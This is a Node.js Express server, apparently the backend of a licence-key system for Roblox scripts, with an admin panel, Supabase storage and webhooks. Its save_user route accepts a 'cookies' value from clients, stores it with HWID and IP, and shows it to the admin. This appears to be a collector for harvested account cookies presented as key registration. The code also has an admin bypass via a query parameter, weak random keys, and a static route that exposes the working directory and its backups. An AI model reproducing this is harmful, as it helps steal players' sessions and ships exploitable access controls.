const express = require('express');
const crypto = require('crypto');
const path = require('path');
const fs = require('fs');
const { createHash, randomBytes } = require('crypto');
const { promisify } = require('util');
const rateLimit = require('express-rate-limit');
const helmet = require('helmet');
const cors = require('cors');
const cookieParser = require('cookie-parser');
const session = require('express-session');
const NodeCache = require('node-cache');
const { createClient } = require('@supabase/supabase-js');
const axios = require('axios');
const os = require('os');
const si = require('systeminformation');

require('dotenv').config({ path: '/etc/secrets/.env' });

// Конфигурация
const SUPABASE_URL = process.env.SUPABASE_URL;
const SUPABASE_KEY = process.env.SUPABASE_KEY;
const SECRET_KEY = process.env.SECRET_KEY;
const ADMIN_PASS = process.env.ADMIN_PASS;
const ADMIN_SESSION_KEY = process.env.ADMIN_SESSION_KEY;
const SESSION_COOKIE_NAME = process.env.sskk;
const ADMIN_GAME = process.env.ADMIN_GAME;
const WEBHOOK_URLS = process.env.WEBHOOK_URLS ? process.env.WEBHOOK_URLS.split(',') : [];

// Supabase клиент
const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);

// Regex паттерны
const KEY_REGEX = /^Apex_[a-f0-9]{35}$/;
const HWID_REGEX = /^[0-9A-Fa-f\-]{5,}$/;

// Система ролей
const USER_ROLES = {
    'user': 1,
    'premium': 2,
    'admin': 3
};

// Ошибки
const ERR_DB_FAIL = 'Database request failed';
const ERR_ACCESS_DENIED = 'Access denied';
const ERR_SAVE_KEY = 'Failed to save key';

// Инициализация приложения
const app = express();
const appStartTime = Date.now();

// Middleware
app.use(helmet({
    contentSecurityPolicy: false,
}));
app.use(cors({
    origin: ["https://www.roblox.com", "https://*.robloxlabs.com"],
    credentials: true
}));
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(session({
    name: SESSION_COOKIE_NAME,
    secret: ADMIN_SESSION_KEY,
    resave: false,
    saveUninitialized: false,
    cookie: {
        secure: true,
        httpOnly: true,
        sameSite: 'lax',
        maxAge: 7 * 24 * 60 * 60 * 1000 // 7 дней
    }
}));

// Rate limiting
const limiter = rateLimit({
    windowMs: 60 * 1000, // 1 минута
    max: 20,
    message: 'Too many requests'
});
app.use('/api/', limiter);

// Кэширование
const cache = new NodeCache({ stdTTL: 21600 }); // 6 часов

// Статистика в памяти
const statsData = {
    dailyUsers: [],
    keyVerifications: [],
    apiCalls: new Map(),
    errors: []
};

// ----------------------
// Utility functions
// ----------------------
function getHwidIdentifier(req) {
    const hwid = req.body ? req.body.hwid : null;
    return hwid || req.ip;
}

function validateHwid(hwid) {
    return HWID_REGEX.test(hwid);
}

function validateIp(ip) {
    const ipRegex = /^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$|^([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}$/;
    return ipRegex.test(ip);
}

function getUserId(ip, hwid) {
    return Buffer.from(`${ip}_${hwid}`).toString('base64');
}

function safeHtml(s) {
    if (!s) return '';
    return s.toString()
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;');
}

function generateKey(length = 35) {
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let keyStr = '';
    for (let i = 0; i < length; i++) {
        keyStr += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    
    const hashedKey = createHash('sha256').update(keyStr).digest('hex').substring(0, 35);
    return `Apex_${hashedKey}`;
}

function validateKey(key) {
    return KEY_REGEX.test(key);
}

async function triggerWebhooks(eventType, data) {
    const promises = WEBHOOK_URLS
        .filter(url => url.trim())
        .map(url => 
            axios.post(url, { event: eventType, data }, { timeout: 5000 })
                .catch(() => {}) // Игнорируем ошибки вебхуков
        );
    await Promise.allSettled(promises);
}

function updateStats(eventType, data = null) {
    const today = new Date().toISOString().split('T')[0];
    const currentCount = statsData.apiCalls.get(today) || 0;
    statsData.apiCalls.set(today, currentCount + 1);
    
    const timestamp = new Date().toISOString();
    
    switch (eventType) {
        case 'new_user':
            statsData.dailyUsers.push({
                timestamp,
                hwid: data?.hwid,
                ip: data?.ip
            });
            // Ограничиваем размер
            if (statsData.dailyUsers.length > 1000) {
                statsData.dailyUsers.shift();
            }
            break;
        case 'key_verify':
            statsData.keyVerifications.push({
                timestamp,
                key: data?.key,
                result: data?.result
            });
            if (statsData.keyVerifications.length > 5000) {
                statsData.keyVerifications.shift();
            }
            break;
        case 'error':
            statsData.errors.push({
                timestamp,
                error: data?.error,
                endpoint: data?.endpoint
            });
            if (statsData.errors.length > 1000) {
                statsData.errors.shift();
            }
            break;
    }
}

async function backupDatabase() {
    try {
        const { data: keys, error: keysError } = await supabase
            .from('keys')
            .select('*');
            
        const { data: users, error: usersError } = await supabase
            .from('users')
            .select('*');
            
        if (keysError || usersError) {
            throw new Error('Failed to fetch data for backup');
        }
        
        const backupData = {
            timestamp: new Date().toISOString(),
            keys: keys || [],
            users: users || []
        };
        
        const backupDir = 'backups';
        if (!fs.existsSync(backupDir)) {
            fs.mkdirSync(backupDir, { recursive: true });
        }
        
        const filename = `backups/backup_${new Date().toISOString().replace(/[:.]/g, '-')}.json`;
        fs.writeFileSync(filename, JSON.stringify(backupData, null, 2));
        
        // Удаляем старые бэкапы (оставляем последние 10)
        const files = fs.readdirSync(backupDir)
            .filter(f => f.startsWith('backup_'))
            .sort();
            
        for (let i = 0; i < files.length - 10; i++) {
            fs.unlinkSync(path.join(backupDir, files[i]));
        }
        
    } catch (error) {
        console.error('Backup error:', error);
    }
}

function sendDailyReport() {
    const yesterday = new Date();
    yesterday.setDate(yesterday.getDate() - 1);
    const yesterdayStr = yesterday.toISOString().split('T')[0];
    
    const dailyUsers = statsData.dailyUsers.filter(u => 
        u.timestamp.split('T')[0] === yesterdayStr
    ).length;
    
    const dailyVerifications = statsData.keyVerifications.filter(v => 
        v.timestamp.split('T')[0] === yesterdayStr
    ).length;
    
    const dailyErrors = statsData.errors.filter(e => 
        e.timestamp.split('T')[0] === yesterdayStr
    ).length;
    
    const report = `
📊 Ежедневный отчет (${yesterdayStr}):
• Новых пользователей: ${dailyUsers}
• Проверок ключей: ${dailyVerifications}
• API вызовов: ${statsData.apiCalls.get(yesterdayStr) || 0}
• Ошибок: ${dailyErrors}
`;
    console.log(report);
}

async function cleanupOldKeysAndUsers() {
    while (true) {
        try {
            const threshold = new Date(Date.now() - 24 * 60 * 60 * 1000).toISOString();
            
            // Получаем старые ключи
            const { data: oldKeys, error } = await supabase
                .from('keys')
                .select('*')
                .lt('created_at', threshold);
                
            if (error) {
                console.error('Failed to fetch old keys:', error);
                await new Promise(resolve => setTimeout(resolve, 86400000)); // 24 часа
                continue;
            }
            
            for (const keyEntry of oldKeys || []) {
                try {
                    // Удаляем ключ
                    const { error: deleteKeyError } = await supabase
                        .from('keys')
                        .delete()
                        .eq('key', keyEntry.key);
                        
                    if (!deleteKeyError) {
                        console.log(`Deleted key ${keyEntry.key}`);
                        
                        // Удаляем пользователей с этим ключом
                        const { error: deleteUserError } = await supabase
                            .from('users')
                            .delete()
                            .eq('key', keyEntry.key);
                            
                        if (!deleteUserError) {
                            console.log(`Deleted users with key ${keyEntry.key}`);
                        }
                    }
                } catch (e) {
                    console.error('Error deleting key:', e);
                }
            }
            
        } catch (error) {
            console.error('Cleanup error:', error);
            updateStats('error', { error: error.message, endpoint: 'cleanup' });
        }
        
        await new Promise(resolve => setTimeout(resolve, 24 * 60 * 60 * 1000)); // 24 часа
    }
}

async function scheduledTasks() {
    while (true) {
        try {
            const now = new Date();
            
            // Бэкап каждый день в 2:00
            if (now.getHours() === 2 && now.getMinutes() === 0) {
                await backupDatabase();
            }
            
            // Отчет каждый день в 9:00
            if (now.getHours() === 9 && now.getMinutes() === 0) {
                sendDailyReport();
            }
            
            await new Promise(resolve => setTimeout(resolve, 60 * 1000)); // 1 минута
            
        } catch (error) {
            console.error('Scheduled task error:', error);
            await new Promise(resolve => setTimeout(resolve, 5 * 60 * 1000)); // 5 минут
        }
    }
}

// Запуск фоновых задач
cleanupOldKeysAndUsers();
scheduledTasks();

async function saveKey(key = null) {
    const keyToSave = key || generateKey();
    const payload = {
        key: keyToSave,
        created_at: new Date().toISOString(),
        used: false
    };
    
    try {
        const { error } = await supabase
            .from('keys')
            .insert([payload]);
            
        if (!error) {
            return keyToSave;
        }
    } catch (error) {
        console.error('Save key error:', error);
    }
    return null;
}

// ----------------------
// Middleware для админки
// ----------------------
function requireAdmin(req, res, next) {
    const secret = req.query.d;
    if (secret === SECRET_KEY || req.session.admin_authenticated) {
        return next();
    }
    return res.status(403).send("Ur not admin!");
}

function requireRole(role) {
    return (req, res, next) => {
        const userRole = req.session.role || 'user';
        if (USER_ROLES[userRole] >= USER_ROLES[role]) {
            return next();
        }
        return res.status(403).send("Access denied");
    };
}

// ----------------------
// API Routes
// ----------------------
app.get('/api/health', async (req, res) => {
    try {
        // Проверяем подключение к базе
        const { data, error } = await supabase
            .from('keys')
            .select('key')
            .limit(1);
            
        const dbStatus = error ? 'disconnected' : 'connected';
        const memoryUsage = process.memoryUsage().rss / 1024 / 1024;
        
        const status = {
            status: 'healthy',
            timestamp: new Date().toISOString(),
            database: dbStatus,
            memory_usage: `${memoryUsage.toFixed(2)} MB`,
            active_connections: 0, // В Node.js нет прямого аналога threading.active_count()
            uptime: (Date.now() - appStartTime) / 1000
        };
        
        res.json(status);
    } catch (error) {
        res.status(500).json({ error: 'Health check failed' });
    }
});

app.get('/api/stats', requireAdmin, (req, res) => {
    const today = new Date().toISOString().split('T')[0];
    
    const dailyUsers = statsData.dailyUsers.filter(u => 
        u.timestamp.split('T')[0] === today
    ).length;
    
    const dailyVerifications = statsData.keyVerifications.filter(v => 
        v.timestamp.split('T')[0] === today
    ).length;
    
    const stats = {
        total_users: statsData.dailyUsers.length,
        total_verifications: statsData.keyVerifications.length,
        daily_users: dailyUsers,
        daily_verifications: dailyVerifications,
        api_calls_today: statsData.apiCalls.get(today) || 0,
        recent_errors: statsData.errors.slice(-10),
        system: {
            memory: process.memoryUsage(),
            cpu: process.cpuUsage(),
            platform: os.platform()
        }
    };
    
    res.json(stats);
});

app.get('/api/active_users', requireAdmin, (req, res) => {
    const threshold = new Date(Date.now() - 24 * 60 * 60 * 1000);
    const activeUsers = statsData.dailyUsers.filter(u => 
        new Date(u.timestamp) > threshold
    );
    
    res.json({
        active_users: activeUsers.length,
        users: activeUsers.slice(-50)
    });
});

app.post('/api/clean_old_keys', requireAdmin, async (req, res) => {
    const days = parseInt(req.body.days) || 1;
    const threshold = new Date(Date.now() - days * 24 * 60 * 60 * 1000).toISOString();
    
    try {
        const { data: keys, error } = await supabase
            .from('keys')
            .select('*')
            .lt('created_at', threshold);
            
        if (error) {
            return res.status(500).json({ error: ERR_DB_FAIL });
        }
        
        let deletedCount = 0;
        for (const keyEntry of keys || []) {
            try {
                const { error: deleteError } = await supabase
                    .from('keys')
                    .delete()
                    .eq('key', keyEntry.key);
                    
                if (!deleteError) {
                    deletedCount++;
                }
            } catch (e) {
                console.error('Error deleting key:', e);
            }
        }
        
        res.json({ deleted: deletedCount });
    } catch (error) {
        res.status(500).json({ error: ERR_DB_FAIL });
    }
});

app.get('/api/verify_key', async (req, res) => {
    updateStats('api_call', { endpoint: 'verify_key' });
    
    const key = req.query.key;
    
    // Проверка админского ключа
    if (key === ADMIN_GAME) {
        updateStats('key_verify', { key, result: 'valid_admin' });
        return res.type('text/plain').send('valid');
    }
    
    if (!key || !validateKey(key)) {
        updateStats('key_verify', { key, result: 'invalid_format' });
        return res.type('text/plain').send('invalid');
    }
    
    try {
        // Проверяем кэш
        const cached = cache.get(key);
        if (cached) {
            updateStats('key_verify', { key, result: cached });
            return res.type('text/plain').send(cached);
        }
        
        const { data, error } = await supabase
            .from('keys')
            .select('*')
            .eq('key', key)
            .single();
            
        if (error || !data) {
            updateStats('key_verify', { key, result: 'invalid' });
            cache.set(key, 'invalid');
            return res.type('text/plain').send('invalid');
        }
        
        if (data.used) {
            updateStats('key_verify', { key, result: 'used' });
            cache.set(key, 'used');
            return res.type('text/plain').send('used');
        }
        
        const created_at = new Date(data.created_at);
        const now = new Date();
        
        if (now - created_at > 24 * 60 * 60 * 1000) {
            updateStats('key_verify', { key, result: 'expired' });
            cache.set(key, 'expired');
            return res.type('text/plain').send('expired');
        }
        
        // Помечаем ключ как использованный
        const { error: updateError } = await supabase
            .from('keys')
            .update({ used: true })
            .eq('key', key);
            
        if (updateError) {
            return res.type('text/plain').send('error');
        }
        
        updateStats('key_verify', { key, result: 'valid' });
        cache.set(key, 'valid');
        res.type('text/plain').send('valid');
        
    } catch (error) {
        res.type('text/plain').send('error');
    }
});

app.post('/api/save_user', async (req, res) => {
    updateStats('api_call', { endpoint: 'save_user' });
    
    const data = req.body || {};
    const remote_ip = req.ip || 'unknown_ip';
    
    if (!validateIp(remote_ip)) {
        remote_ip = 'unknown_ip';
    }
    
    const hwid = data.hwid;
    const cookies = data.cookies || '';
    let key = data.key;
    
    if (!hwid || !validateHwid(hwid)) {
        return res.status(400).json({ error: 'Missing or invalid HWID' });
    }
    
    const user_id = getUserId(remote_ip, hwid);
    
    try {
        // Проверяем существующего пользователя
        const { data: existingUsers, error: queryError } = await supabase
            .from('users')
            .select('*')
            .eq('user_id', user_id);
            
        if (queryError) {
            return res.status(500).json({ error: 'Failed to query user' });
        }
        
        if (existingUsers && existingUsers.length > 0) {
            const user = existingUsers[0];
            return res.json({
                status: 'exists',
                key: user.key,
                registered_at: user.registered_at
            });
        }
        
        // Обрабатываем ключ
        if (key) {
            if (!validateKey(key)) {
                key = await saveKey();
            } else {
                const { data: keyData, error: keyError } = await supabase
                    .from('keys')
                    .select('*')
                    .eq('key', key)
                    .single();
                    
                if (keyError || !keyData) {
                    key = await saveKey();
                }
            }
        } else {
            key = await saveKey();
        }
        
        if (!key) {
            return res.status(500).json({ error: ERR_SAVE_KEY });
        }
        
        const payload = {
            user_id,
            cookies,
            hwid,
            key,
            registered_at: new Date().toISOString()
        };
        
        const { error: insertError } = await supabase
            .from('users')
            .insert([payload]);
            
        if (insertError) {
            return res.status(500).json({ error: 'Failed to save user' });
        }
        
        // Триггерим вебхуки и обновляем статистику
        updateStats('new_user', { hwid, ip: remote_ip, key });
        triggerWebhooks('new_user', { hwid, ip: remote_ip, key });
        
        res.json({
            status: 'saved',
            key,
            registered_at: payload.registered_at
        });
        
    } catch (error) {
        res.status(500).json({ error: 'Failed to save user' });
    }
});

// ----------------------
// Static Routes
// ----------------------
app.use(express.static('.'));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/style.css', (req, res) => {
    res.sendFile(path.join(__dirname, 'style.css'));
});

// ----------------------
// Admin Panel
// ----------------------
app.route('/user/admin')
    .get((req, res) => {
        req.session.permanent = true;
        if (req.session.admin_authenticated) {
            return renderAdminPage(req, res);
        }
        
        res.send(`
            <form method="post">
                Пароль: <input type="password" name="passwrd">
                <input type="submit" value="Войти">
            </form>
        `);
    })
    .post(async (req, res) => {
        req.session.permanent = true;
        if (req.session.admin_authenticated) {
            return renderAdminPage(req, res);
        }
        
        const password = req.body.passwrd || (req.body.passwrd);
        if (!password) {
            return res.status(400).send("Missing password");
        }
        
        const hashedInput = createHash('sha256').update(password).digest('hex');
        const hashedAdmin = createHash('sha256').update(ADMIN_PASS).digest('hex');
        
        if (hashedInput === hashedAdmin) {
            req.session.admin_authenticated = true;
            req.session.role = 'admin';
            return renderAdminPage(req, res);
        } else {
            return res.status(403).send("Неверный пароль!");
        }
    });

async function renderAdminPage(req, res) {
    try {
        const { data: keysData, error: keysError } = await supabase
            .from('keys')
            .select('*');
            
        const { data: usersData, error: usersError } = await supabase
            .from('users')
            .select('*');
            
        if (keysError || usersError) {
            return res.status(500).send('Failed to fetch data');
        }
        
        const today = new Date().toISOString().split('T')[0];
        const dailyUsers = statsData.dailyUsers.filter(u => 
            u.timestamp.split('T')[0] === today
        ).length;
        
        const stats = {
            total_users: statsData.dailyUsers.length,
            daily_users: dailyUsers,
            total_verifications: statsData.keyVerifications.length,
            api_calls_today: statsData.apiCalls.get(today) || 0
        };
        
        const htmlContent = generateAdminHTML(keysData || [], usersData || [], stats);
        res.send(htmlContent);
        
    } catch (error) {
        res.status(500).send('Failed to fetch data');
    }
}

function generateAdminHTML(keysData, usersData, stats) {
    const keysRows = keysData.map(k => `
        <tr>
            <td>${safeHtml(k.key)}</td>
            <td>${k.used}</td>
            <td>${safeHtml(k.created_at)}</td>
            <td><button class="delete-key" onclick="deleteKey('${safeHtml(k.key)}')">Delete</button></td>
        </tr>
    `).join('');
    
    const usersRows = usersData.map(u => `
        <tr>
            <td>${safeHtml(u.user_id)}</td>
            <td>${safeHtml(u.hwid)}</td>
            <td>${safeHtml(u.cookies?.substring(0, 50) || '')}...</td>
            <td>${safeHtml(u.key)}</td>
            <td>${safeHtml(u.registered_at)}</td>
            <td><button class="delete-user" onclick="deleteUser('${safeHtml(u.hwid)}')">Delete</button></td>
        </tr>
    `).join('');
    
    return `
    <html>
    <head>
        <title>Admin Panel Pro</title>
        <style>
            body { font-family: Arial; padding: 20px; background-color:#1e1e2f; color:#fff; }
            .dashboard { display: grid; grid-template-columns: repeat(4, 1fr); gap: 15px; margin-bottom: 30px; }
            .stat-card { background: #2d2d44; padding: 15px; border-radius: 8px; }
            .stat-value { font-size: 24px; font-weight: bold; color: #3498db; }
            table { border-collapse: collapse; width: 100%; margin-bottom: 30px; }
            th, td { border: 1px solid #444; padding: 8px; text-align: left; }
            th { background: #333; }
            button { padding: 5px 10px; cursor:pointer; border:none; border-radius:5px; color:#fff; }
            .delete-key { background-color:#e74c3c; }
            .delete-user { background-color:#c0392b; }
            .clean-old { background-color:#3498db; margin-bottom:15px; }
            .refresh { background-color:#27ae60; }
            .search-box { margin: 15px 0; padding: 8px; width: 300px; }
        </style>
        <script>
            async function fetchPost(url, data) {
                const res = await fetch(url, {
                    method:'POST',
                    headers:{'Content-Type':'application/json'},
                    body:JSON.stringify(data)
                });
                return res.json().catch(()=>res.text());
            }
            
            async function deleteKey(key){
                if(confirm('Delete key: ' + key + '?')) {
                    alert(await fetchPost('/api/delete_key',{key:key}));
                    location.reload();
                }
            }
            
            async function deleteUser(hwid){
                if(confirm('Delete user with HWID: ' + hwid + '?')) {
                    alert(await fetchPost('/api/delete_user',{hwid:hwid}));
                    location.reload();
                }
            }
            
            async function cleanOldKeys(){
                let days = prompt("Удалить ключи старше (дней):","1"); 
                if(!days) return;
                let data = await fetchPost('/api/clean_old_keys',{days:parseInt(days)})
                alert("Удалено ключей: "+data.deleted);
                location.reload();
            }
            
            function searchTable(tableId, inputId) {
                var input = document.getElementById(inputId);
                var filter = input.value.toLowerCase();
                var table = document.getElementById(tableId);
                var tr = table.getElementsByTagName("tr");
                
                for (var i = 1; i < tr.length; i++) {
                    var td = tr[i].getElementsByTagName("td");
                    var show = false;
                    for (var j = 0; j < td.length; j++) {
                        if (td[j].innerHTML.toLowerCase().indexOf(filter) > -1) {
                            show = true;
                            break;
                        }
                    }
                    tr[i].style.display = show ? "" : "none";
                }
            }
            
            function exportToCSV(tableId, filename) {
                var table = document.getElementById(tableId);
                var csv = [];
                var rows = table.querySelectorAll('tr');
                
                for (var i = 0; i < rows.length; i++) {
                    var row = [], cols = rows[i].querySelectorAll('td, th');
                    
                    for (var j = 0; j < cols.length; j++) {
                        row.push('"' + cols[j].innerText + '"');
                    }
                    
                    csv.push(row.join(','));
                }
                
                var csvFile = new Blob([csv.join('\\n')], {type: 'text/csv'});
                var downloadLink = document.createElement('a');
                downloadLink.download = filename;
                downloadLink.href = window.URL.createObjectURL(csvFile);
                downloadLink.style.display = 'none';
                document.body.appendChild(downloadLink);
                downloadLink.click();
            }
        </script>
    </head>
    <body>
        <h1>🚀 Admin Panel Pro</h1>
        
        <!-- Дашборд со статистикой -->
        <div class="dashboard">
            <div class="stat-card">
                <div>Всего пользователей</div>
                <div class="stat-value">${stats.total_users}</div>
            </div>
            <div class="stat-card">
                <div>Пользователей сегодня</div>
                <div class="stat-value">${stats.daily_users}</div>
            </div>
            <div class="stat-card">
                <div>Проверок ключей</div>
                <div class="stat-value">${stats.total_verifications}</div>
            </div>
            <div class="stat-card">
                <div>API вызовов сегодня</div>
                <div class="stat-value">${stats.api_calls_today}</div>
            </div>
        </div>

        <div style="margin-bottom: 20px;">
            <button class="clean-old" onclick="cleanOldKeys()">🗑️ Удалить старые ключи</button>
            <button class="refresh" onclick="location.reload()">🔄 Обновить</button>
            <button onclick="exportToCSV('keysTable', 'keys_export.csv')">📊 Экспорт ключей</button>
            <button onclick="exportToCSV('usersTable', 'users_export.csv')">📊 Экспорт пользователей</button>
        </div>

        <h2>🔑 Keys (${keysData.length})</h2>
        <input type="text" class="search-box" id="keysSearch" onkeyup="searchTable('keysTable', 'keysSearch')" placeholder="Поиск по ключам...">
        <table id="keysTable">
            <tr><th>Key</th><th>Used</th><th>Created At</th><th>Action</th></tr>
            ${keysRows}
        </table>
        
        <h2>👥 Users (${usersData.length})</h2>
        <input type="text" class="search-box" id="usersSearch" onkeyup="searchTable('usersTable', 'usersSearch')" placeholder="Поиск по пользователям...">
        <table id="usersTable">
            <tr><th>User ID</th><th>HWID</th><th>Cookies</th><th>Key</th><th>Registered At</th><th>Action</th></tr>
            ${usersRows}
        </table>
    </body>
    </html>
    `;
}

// ----------------------
// Дополнительные эндпоинты
// ----------------------
app.get("/api/checkUpdate/KeySystem", (req, res) => {
    res.json({"update_available": false});
});

app.get("/api/AntiKick", (req, res) => {
    res.send("pastefy.app/0vPA1qOu/raw");
});

app.get("/api/GetScript/KeySystem", (req, res) => {
    res.json({'loadURL': ''});
});

app.post('/api/delete_key', requireAdmin, async (req, res) => {
    const key = req.body.key;
    if (!key || !validateKey(key)) {
        return res.status(400).send('Missing or invalid key');
    }
    
    try {
        const { error } = await supabase
            .from('keys')
            .delete()
            .eq('key', key);
            
        if (error) {
            return res.status(500).send(ERR_DB_FAIL);
        }
        res.send('Key deleted');
    } catch (error) {
        res.status(500).send(ERR_DB_FAIL);
    }
});

app.post('/api/delete_user', requireAdmin, async (req, res) => {
    const hwid = req.body.hwid;
    if (!hwid || !validateHwid(hwid)) {
        return res.status(400).send('Missing or invalid hwid');
    }
    
    try {
        const { error } = await supabase
            .from('users')
            .delete()
            .eq('hwid', hwid);
            
        if (error) {
            return res.status(500).send(ERR_DB_FAIL);
        }
        res.send('User deleted');
    } catch (error) {
        res.status(500).send(ERR_DB_FAIL);
    }
});

// ----------------------
// Запуск приложения
// ----------------------
const PORT = process.env.PORT || 5000;

// Создаем папку для бэкапов при старте
if (!fs.existsSync('backups')) {
    fs.mkdirSync('backups', { recursive: true });
}

app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on port ${PORT}`);
});

module.exports = app;
